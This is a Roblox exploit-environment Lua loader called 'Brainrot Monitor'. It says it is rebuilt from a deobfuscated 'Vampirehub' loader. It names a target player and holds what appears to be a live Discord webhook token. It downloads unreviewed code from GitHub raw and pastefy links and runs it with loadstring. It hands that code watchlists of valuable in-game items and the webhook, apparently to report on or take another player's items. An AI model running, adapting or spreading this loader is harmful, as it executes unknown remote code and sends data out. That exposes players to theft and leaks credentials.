--[[
    PRIMEz Studios - Brainrot Monitor (PRIMEz Edition) v1.0.0
    ---------------------------------------------------------
    Rebuilt from the deobfuscated "Vampirehub" loader (Nocturne Obfuscador v1.2).
    Same runtime interface as the original logic driver:
        script(targetId, targetUser, webhookUrl, brainrots, baseSkins, gears)

    Edit the CONFIG block below. Nothing else needs to change.
]]

-- =========================================================================
-- CONFIG - edit these values only
-- =========================================================================

local CONFIG = {
    -- One or more targets. Each entry: { id = <UserId>, user = "<Username>" }
    Targets = {
        { id = 8387419826, user = "Tochinito8383" },
        -- { id = 0, user = "AnotherTarget" },
    },

    -- Discord webhook that receives the notifications.
    WebhookUrl = "https://discord.com/api/webhooks/1567309657201057893/0u4MOdxCQajwrjJpJ_cJfCRXGerzOeCcVbk1xWtcGGBdOm1MQSVKdFzuobkLoER64g8Y",

    -- Remote driver (logic). Swap this URL to point at your own logic build.
    LogicUrl = "https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua",

    -- Extra scripts fetched in parallel before the monitor starts.
    PreloadUrls = {
        "https://pastefy.app/RsqRaQC0/raw",
        "https://pastefy.app/LYkPHkU1/raw",
    },
}

-- =========================================================================
-- WATCHLISTS
-- =========================================================================

local TargetBrainrots = {
["Dragon Skeletonini"] = true,
    ["Phoenix"] = true,
    ["Plant Bros"] = true,
    ["Hydra Serpent"] = true,
    ["Orchidox"] = true,
    ["Skibidi Toilet"] = true,
    ["Strawberry Elephant"] = true,
    ["Meowl"] = true,
    ["Los Dragons"] = true,
    ["La Craft Machine"] = true,
    ["Gold and Diamond"] = true,
    ["Dragon Cannelloni"] = true,
    ["Dragon Gingerini"] = true,
    ["Hydra Bunny"] = true,
    ["Antonio"] = true,
    ["Griffin"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["John Pork"] = true,
    ["Elefanto Frigo"] = true,
    ["Rubrikiko"] = true,
    ["Pancake and Syrup"] = true,
    ["Capitano Americano"] = true,
    ["Arcadragon"] = true,
    ["Rico Dinero"] = true,
    ["Dug Dug Dug"] = true,
    ["Tirilikalika Tirilikalako"] = true,
    ["Globa Steppa"] = true,
    ["Kalika Bros"] = true,
    ["Dragon Aquanini"] = true,
    ["Headless Horseman"] = true,
    ["La Supreme Combinasion"] = true,
    ["La Casa Boo"] = true,
    ["Signore Carapace"] = true,
    ["Fishino Clownino"] = true,
    ["Duggy Bros"] = true,
    ["Cerberus"] = true,
    ["Kraken"] = true,
    ["Rhino Helicopterino"] = true,
    ["Venuspino"] = true,
    ["Sammyni Cakini"] = true,
    ["Los Hackers"] = true,
    ["Centrucci Nuclucci"] = true,
    ["Jelly Moby"] = true,
    ["Foxini Lanternini"] = true,
    ["Gorillo Subwoofero"] = true,
    ["Bearito Cabinito"] = true,
    ["Digi Narwhal"] = true,
    ["Los Admins"] = true,
    ["Moby Bros"] = true,
    ["Boppin Bunny"] = true,
    ["Bunny and Eggy"] = true,
    ["Burguro and Fryuro"] = true,
    ["Capitano Moby"] = true,
    ["Cash or Card"] = true,
    ["Celestial Pegasus"] = true,
    ["Celularcini Viciosini"] = true,
    ["Cloverat Clapat"] = true,
    ["Cooki and Milki"] = true,
    ["Fragola La La La"] = true,
    ["Fortunu and Cashuru"] = true,
    ["Festive 67"] = true,
    ["Fragrama and Chocrama"] = true,
    ["Garama and Madundung"] = true,
    ["Ginger Gerat"] = true,
    ["Guest 666"] = true,
    ["Hopilikalika Hopilikalako"] = true,
    ["Jolly Jolly Sahur"] = true,
    ["Ketupat Bros"] = true,
    ["La Food Combinasion"] = true,
    ["La Lucky Grande"] = true,
    ["La Secret Combinasion"] = true,
    ["La Romantic Grande"] = true,
    ["La Taco Combinasion"] = true,
    ["Los Secret Combinasionas"] = true,
    ["Examen Bros"] = true,
    ["Pizza and Ranch"] = true,
    ["Bumbatron"] = true,
    ["Yetimatic"] = true,
    ["Los Amigos"] = true,
    ["S'more Serat"] = true,
    ["La Breakfast Combinasion"] = true,
    ["Los Primos"] = true,
    ["Los Sekolahs"] = true,
    ["Los Spaghettis"] = true,
    ["Los Tacoritas"] = true,
    ["Love Love Bear"] = true,
    ["Noo My Examine"] = true,
    ["Rosey and Teddy"] = true,
    ["Spooky and Pumpky"] = true,
    ["Grabatron"] = true,
    ["Rubiko and Kubiko"] = true,
    ["Candini Fluffini"] = true,
    ["La Fuse Machine"] = true,
    ["Polaroidini"] = true,
    ["Sammyni Truckini"] = true,
    ["Money Money Bros"] = true,
    ["Steakini Fattini"] = true,
    ["Caylusaurus"] = true,
    ["John Doe"] = true,
    ["Los Tangcitos"] = true,
    ["Los Tictacs"] = true,
    ["Chillin Chili"] = true,
    ["Chipso and Queso"] = true,
    ["Gobblino Uniciclino"] = true,
    ["Gold Gold Gold"] = true
}

local TargetBaseSkins = {
["Aquatic"] = true,
    ["Bunny Basket"] = true,
    ["Candy"] = true,
    ["Christmas"] = true,
    ["Cursed"] = true,
    ["Cyber"] = true,
    ["Diamond"] = true,
    ["Divine"] = true,
    ["Easter"] = true,
    ["Galaxy"] = true,
    ["Gingerbread"] = true,
    ["Gold"] = true,
    ["Halloween"] = true,
    ["Lava"] = true,
    ["Lucky"] = true,
    ["Octo"] = true,
    ["Pot of Gold"] = true,
    ["Radioactive"] = true,
    ["Rainbow"] = true,
    ["Rose"] = true,
    ["Summer"] = true,
    ["Taco"] = true,
    ["Valentines"] = true,
    ["Yin Yang"] = true,
    ["Tralalero"] = true
}

local TargetGears = {
["Alien Slap"] = true,
    ["Blackhole Bomb"] = true,
    ["Bloodmoon Hammer"] = true,
    ["Bloodmoon Slap"] = true,
    ["Candy Sentry"] = true,
    ["Candy Slap"] = true,
    ["Cupid's Wings"] = true,
    ["Cursed Slap"] = true,
    ["Cyber Slap"] = true,
    ["Demon's Head"] = true,
    ["Divine Slap"] = true,
    ["Lava Blaster"] = true,
    ["Lava Slap"] = true,
    ["Radioactive Airstrike"] = true,
    ["Radioactive Slap"] = true,
    ["Rainbow Hammer"] = true,
    ["Rainbow Slap"] = true,
    ["Santa's Sleigh"] = true,
    ["Waverider"] = true,
    ["Witch's Broom"] = true,
    ["Yin Yang Lamp"] = true,
    ["Yin Yang Slap"] = true,
    ["Phantom Slap"] = true,
    ["Crystal Slap"] = true
}

-- =========================================================================
-- LOADER
-- =========================================================================

local function httpGet(url)
    local ok, result = pcall(function()
        return game:HttpGet(url, true)
    end)
    if ok then return result end
    local ok2, result2 = pcall(function()
        return game:GetService("HttpService"):GetAsync(url)
    end)
    if ok2 then return result2 end
    return nil
end

local function runRemote(url)
    local src = httpGet(url)
    if not src then
        warn("[PRIMEz] failed to fetch: " .. tostring(url))
        return nil
    end
    local fn, err = (loadstring or load)(src)
    if not fn then
        warn("[PRIMEz] compile error in " .. tostring(url) .. ": " .. tostring(err))
        return nil
    end
    return fn()
end

task.spawn(function()
    for _, url in ipairs(CONFIG.PreloadUrls) do
        task.spawn(function()
            pcall(runRemote, url)
        end)
    end
end)

task.spawn(function()
    local driver = runRemote(CONFIG.LogicUrl)
    if type(driver) ~= "function" then
        warn("[PRIMEz] logic driver did not return a function")
        return
    end
    for _, target in ipairs(CONFIG.Targets) do
        task.spawn(function()
            local ok, err = pcall(driver,
                target.id, target.user, CONFIG.WebhookUrl,
                TargetBrainrots, TargetBaseSkins, TargetGears)
            if not ok then
                warn("[PRIMEz] monitor error for " .. tostring(target.user) .. ": " .. tostring(err))
            end
        end)
    end
end)
